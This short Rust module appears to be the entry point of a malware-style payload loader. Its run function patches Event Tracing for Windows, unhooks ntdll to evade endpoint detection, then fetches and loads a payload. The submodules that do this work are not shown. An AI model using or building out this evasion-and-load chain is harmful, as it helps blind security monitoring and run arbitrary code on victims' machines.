mod fetch;
mod load;
mod patch;
mod resolve;
mod types;
mod unhook;

use crate::run::fetch::get_payload;
use crate::run::load::load;
use crate::run::patch::patch_etw;
use crate::run::unhook::unhook_ntdll;

pub fn run() {
    patch_etw();
    unhook_ntdll();
    load(get_payload());
}
